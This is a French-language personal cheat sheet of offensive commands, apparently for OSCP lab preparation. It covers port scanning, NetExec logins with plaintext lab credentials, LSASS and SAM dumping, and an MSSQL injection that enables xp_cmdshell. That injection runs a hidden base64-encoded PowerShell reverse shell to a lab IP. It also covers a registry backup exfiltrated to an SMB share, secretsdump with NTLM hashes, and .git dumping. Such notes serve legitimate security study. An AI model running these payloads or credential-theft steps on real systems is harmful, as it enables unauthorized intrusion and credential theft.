# OSCP

## Scan de port (TCP)

```bash
nmap -T4 -Pn --open -p- -oA nmap_full -iL ip.txt

ports=$(grep -oP '\d+/open[^/]*/tcp' nmap_full.gnmap | cut -d'/' -f1 | sort -u | tr '\n' ',' | sed 's/,$//')

nmap -T4 -Pn -sC -sV --open -p $ports -oN nmap_full_detailed.txt -iL ip.txt
```
## Scan de port (UDP)
```bash
nmap -T4 -Pn -sU --open --top-port=20 -oA nmap_udp -iL ip.txt

ports=$(grep -oP '\d+/open[^/]*/udp' nmap_udp.gnmap | cut -d'/' -f1 | sort -u | tr '\n' ',' | sed 's/,$//')

nmap -T4 -Pn -sU -sC -sV --open -p $ports -oN nmap_udp_detailed.txt -iL ip.txt
```
## Liste d'adresse IP
```bash
grep open nmap_udp_G.txt | cut -d" " -f2
```

## NetExec
```bash
nxc smb ip.txt -u 'Eric.Wallows' -p 'EricLikesRunning800'
nxc smb ip.txt -u 'Eric.Wallows' -p 'EricLikesRunning800' --shares
nxc smb 192.168.195.95 -u 'Eric.Wallows' -p 'EricLikesRunning800' -M lsassy
nxc smb 192.168.195.95 -u 'Eric.Wallows' -p 'EricLikesRunning800' --sam

nxc ldap 192.168.195.97 -u 'Eric.Wallows' -p 'EricLikesRunning800' --users-export users.txt

nxc smb ip.txt --generate-hosts-file ./hosts
sudo tee -a /etc/hosts < hosts
```

## Exploits 

```bash
sudo apt install default-jdk -y
```

Prendre le temps de bien lire les messages d'erreurs
Bien lire le code en conséquence pour comprendre

Compiler avec -static pur inclure les dépendances
```bash
gcc 50808.c -static -o CVE-2022-0847
```

Erreur python3 -> essayer python2
## Misc

```powershell
cd C:\xampp\mysql\bin\
.\mysqldump.exe -A -u root > output.txt
```

## SQLi

```
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--

'; EXEC xp_cmdshell 'powershell -nop -noni -w hidden -ep bypass -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQA5ADIALgAxADYAOAAuADQANQAuADIANAA1ACcALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0A
```

## BackupOperator domaine

```bash
listener_add --addr 0.0.0.0:445 --to 127.0.0.1:445 --tcp
```

```bash
impacket-smbserver -smb2support someshare ./
```

```bash
impacket-reg medtech.com/joe:'Flowers1'@172.16.190.10 backup -o '\\<IP_PIVOT>\someshare\'
```

```bash
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

```bash
impacket-secretsdump medtech.com/'DC01$'@172.16.190.10 -hashes aad3b435b51404eeaad3b435b51404ee:2e283e8ba256451651cacb72e8fac449
```

## Ruby

```bash
sudo apt install ruby
ruby -v
ruby script.rb arg1 arg2
```

**Avec des dépendances (gems)**
```bash
gem install nom_gem
# ou si le projet a un Gemfile :
bundle install
bundle exec ruby script.rb
```

## Creds
J'ai des creds : je test PARTOUT, je peux être admin d'un côté et pas de l'autre, même entre 2 service d'un même hôte

## Ports inconnus

Port ouvert inconnu
```bash
nc -nv <IP> <PORT>
help
```

port ``1978`` -> RemoteMouse
port ``3003``
## .git exposed

```bash
pipx install git-dumper
git-dumper http://192.168.191.144/.git/ ./output
cd output
git log --all
git show <commit_hash>
git diff HEAD~1
```

## SNMP
https://hacktricks.wiki/en/network-services-pentesting/pentesting-snmp/index.html

```bash
echo public > community
echo private >> community
echo manager >> community

onesixtyone -c community -i ip.txt

snmpwalk -c public -v1 -t 10 192.168.50.151

snmpwalk -c public -v1 192.168.50.151 1.3.6.1.4.1.77.1.2.25

snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.25.4.2.1.2

snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.25.6.3.1.2

snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.6.13.1.3
```